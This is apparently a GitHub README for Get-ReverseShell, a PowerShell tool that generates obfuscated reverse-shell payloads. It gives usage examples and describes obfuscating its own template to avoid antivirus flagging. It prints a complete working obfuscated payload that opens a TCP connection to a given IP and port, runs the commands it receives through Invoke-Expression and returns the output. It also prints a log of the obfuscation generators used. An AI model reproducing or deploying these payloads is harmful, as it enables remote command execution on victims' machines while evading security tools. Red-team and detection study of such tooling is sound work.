# Obfuscated PowerShell Reverse Shells

Get-ReverseShell is a project that stems from the Invoke-PSObfuscation framework, with the sole purpose of producing obfuscated reverse shells for PowerShell. With the way this framework is built, each component of the original payload goes through a randomly selected generator, resulting in a different yield with every execution of this script. 

___IMPORTANT___

Despite this script being built on Kali, you can also use it on Windows to produce these payloads. While I encourage you to keep this script on Kali, I have added some safeguards for those that will store this on a system with Antivirus installed, such as Windows with Defender enabled.

This script contains a function called `Get-Template` that produces the reverse shell payload that is passed through each of the generator functions. If the template script is stored in its raw state, it would be instantly flagged once it's written to disk or executed. To help prevent this from happening, the function has been relatively obfuscated. However, the obfuscated payloads themselves are fair game to store where you deem appropriate.

## Requirements

This script was built and tested on the following version Kali Linux and PowerShell. The obfuscated reverse shells are compatible on Windows/Linux systems that support PowerShell newer than version 2.0

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      7.2.4
PSEdition                      Core
GitCommitId                    7.2.4
OS                             Linux 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07)
Platform                       Unix
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0
```

## Usage Examples

To load the script on Kali Linux, open a terminal then run `pwsh`. With PowerShell now running in your terminal, you can load the script into your current session by dot sourcing the script.

```shell
┌──(kali㉿kali)-[~]
└─$ pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.


┌──(kali㉿kali)-[/home/kali]
└─PS> . ./Get-ReverseShell.ps1
```

If you run the script and supply only an IP address and port, then every supported script component will be obfuscated and output to the console.

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> Get-ReverseShell -Ip 127.0.0.1 -Port 443

     >> Layer 0 Reverse Shell
     >> https://github.com/gh0x0st

$9bu74RLxidUDk = & (("4us0Qpzt5b9navewiNEjqfxmZgRrSBKFW3JMVX2I8LDY6HACyTc7dOhkP-U1loG")[17,14,15,57,53,9,19,14,50,7] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_})(([string]::join('', ( (49,50,55,46,48,46,48,46,49) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_}),$(0+0-0-443+443+443));$kxjaLK6qrECXjf2 = ((& (("tFqYIQ1HnjmkK9PdoUbMzlCR27uv4yEpNxr85L-XSfWJhDiZTac3BGg6wesVOA0")[46,8,27,16,11,57,38,57,33,31,34,57,58,58,46,16,8] -join '')([string]::join('', ( (36,57,98,117,55,52,82,76,120,105,100,85,68,107,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_})));[byte[]]$9uR0tN24DBEA9YsVNLOnIrx2s = 0..$($(0+60000)+$(0+0-0+5000)+(500)+($(35)))|%{;$_}|%{0};while(($5aH = $kxjaLK6qrECXjf2.Read($9uR0tN24DBEA9YsVNLOnIrx2s, 0, $9uR0tN24DBEA9YsVNLOnIrx2s.Length)) -ne 0){;$jIguPvaSK1ZilFymBVhTA = (& (("4us0Qpzt5b9navewiNEjqfxmZgRrSBKFW3JMVX2I8LDY6HACyTc7dOhkP-U1loG")[17,14,15,57,53,9,19,14,50,7] -join '') -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_})).GetString($9uR0tN24DBEA9YsVNLOnIrx2s,0, $5aH);$U = (& (("PljCFMKRq1-LpYeVWtNnku2Q8iJT0OzHg7Uxo5svyXh9GcAEawIb643dmfBSZrD")[50,19,39,36,20,14,10,47,35,12,61,14,38,38,25,36,19] -join '') $jIguPvaSK1ZilFymBVhTA 2>&1 |%{;$_}| & (("MTSO1XIqriP2ox4bGsuZtk0wEHhj9f8QnVdaBgcyLFN6Cz3DYWR-l5vUAmKJpe7")[3,18,20,51,2,20,8,9,32,37] -join '') );$GemSDxKaU = $U + $([char](30+87-30)+[char](97*72/97)+[char](106*65/106)+[char](21*84/21)+[char](0+32-0)+[char](88*87/88)+[char](0+72-0)+[char](0+69-0)+[char](0+82-0)+[char](51+69-51)+[char](80+62-80)+[char](42*32/42)) -replace $('W'+'H'+'E'+'R'+'E'),(& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_})).Path -replace $([char](113*87/113)+[char](0+72-0)+[char](104*65/104)+[char](29+84-29)),([string]::join('', ( (80,83) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_});$xz1V87nrk4C9g2omRSHwHrTU1 = ([text.encoding]::ASCII).GetBytes($GemSDxKaU);$kxjaLK6qrECXjf2.Write($xz1V87nrk4C9g2omRSHwHrTU1,0,$xz1V87nrk4C9g2omRSHwHrTU1.Length);$($kxjaLK6qrECXjf2.Flush())};$((& (("KDU-6exQHZgPzTYpVCvijL79Nf4du5ns2F3oym8WSrbGOE10tIqcAJlBwRMhXak")[19,30,18,35,62,5,3,5,6,15,41,5,31,31,19,35,30] -join '')([string]::join('', ( (36,57,98,117,55,52,82,76,120,105,100,85,68,107,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_})))
```

In lieu of having the output sent to the console, we can also have the output saved to a file instead.

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> Get-ReverseShell -Ip 127.0.0.1 -Port 443 -OutFile obfuscated.ps1

     >> Layer 0 Reverse Shell
     >> https://github.com/gh0x0st

[*] Writing payload to obfuscated.ps1
```

Where this script has been built from `Invoke-PSObfuscation`, we have the ability to target specific script components. In addition to this, if we wanted to learn more about what was obfuscated and back trace the function that generated the obfuscated logic, we can include to the `ShowChanges` paramter. This paramter will instruct the script to display each targeted component, the obfuscated value that will be replacing it and the generator that was used. 

```shell
┌──(kali㉿kali)-[/home/kali/]
└─PS> Get-ReverseShell -Ip 127.0.0.1 -Port 443 -Aliases -Cmdlets -Methods -ShowChanges

     >> Layer 0 Reverse Shell
     >> https://github.com/gh0x0st

[*] Resolving aliases
[-] % >> ForEach-Object
[-] iex >> Invoke-Expression
[-] pwd >> Get-Location
[*] Targeting cmdlets
[-] Generator 1 >> New-Object >> & (("-FxDfVShXwGbQL92Ir4OAKiYvBce3EuUz6tTH8sqCM15aR7gZPdnyjJW0mlpoNk")[61,27,9,0,19,11,53,27,26,34] -join '')
[-] Generator 1 >> New-Object >> & (("AJkOmSpw2HGodY18EqsnlCX6iZbDx0yhKIueL9BRM-3NWUPQ5r7Fjaz4VfcvgTt")[43,35,7,41,3,26,52,35,58,62] -join '')
[-] Generator 2 >> Invoke-Expression >> & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})
[-] Generator 1 >> Out-String >> & (("FKBgMmk43lvqcnoZEzWU1rHViJwpAQuOfxGbLC82Y5Ih9XNTd-syS6aDtPje0R7")[31,30,56,49,52,56,21,24,13,3] -join '')
[-] Generator 1 >> Get-Location >> & (("hmdf2Y5RJ8wNAF19rIVvOonG6ckpH4sSlx0QWqCyz3bBtUaguMZ-jiXPKELD7eT")[23,61,44,51,58,21,25,46,44,53,21,22] -join '')
[*] Targeting method invocations
$TuVIzXNvenGCmPU.GetStream() >> $($(($TuVIzXNvenGCmPU.GetStream())))
[-] Generator 2 >> $VaKhGdMJw6.Flush() >> $($(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,86,97,75,104,71,100,77,74,119,54,46,70,108,117,115,104,40,41) |%{ ( [char][int] $_)})) | % {$_})))
$TuVIzXNvenGCmPU.Close() >> $($($($TuVIzXNvenGCmPU.Close())))
```
